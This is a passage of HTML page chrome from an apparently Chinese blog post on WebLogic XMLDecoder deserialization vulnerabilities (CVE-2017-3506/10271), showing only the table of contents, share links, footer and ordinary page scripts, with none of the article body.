class="toc-number">1.3.1.1.</span> <span class="toc-text">XMLEncoder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLDecoder"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">XMLDecoder</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-XML-%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7"><span class="toc-number">1.3.2.</span> <span class="toc-text">常见的 XML 标签和属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-XML-%E5%A3%B0%E6%98%8E"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1. XML 声明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%A0%B9%E5%85%83%E7%B4%A0"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2. 根元素 &lt;java&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AF%B9%E8%B1%A1%E5%85%83%E7%B4%A0"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">3. 对象元素 &lt;object&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%B1%9E%E6%80%A7%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">4. 属性设置 &lt;void&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">5. 基本数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%95%B0%E7%BB%84%E5%92%8C%E9%9B%86%E5%90%88"><span class="toc-number">1.3.2.6.</span> <span class="toc-text">6. 数组和集合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.2.7.</span> <span class="toc-text">7. 方法调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-Null-%E5%80%BC"><span class="toc-number">1.3.2.8.</span> <span class="toc-text">8. Null 值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLDecoder%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%EF%BC%88%E5%8F%AF%E4%B8%8D%E7%9C%8B%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">XMLDecoder解析流程分析（可不看）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBDemo"><span class="toc-number">1.3.4.</span> <span class="toc-text">攻击Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-3506-CVE-2017-10271"><span class="toc-number">1.3.5.</span> <span class="toc-text">CVE-2017-3506&amp;CVE-2017-10271</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.5.3.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9Epayload"><span class="toc-number">1.3.5.4.</span> <span class="toc-text">漏洞payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">1.3.5.5.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/08/Weblogic/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/08/Weblogic/&text=Weblogic系列"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/08/Weblogic/&is_video=false&description=Weblogic系列"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Weblogic系列&body=Check out this article: http://example.com/2024/09/08/Weblogic/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/08/Weblogic/&name=Weblogic系列&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/08/Weblogic/&t=Weblogic系列"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        John Doe
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
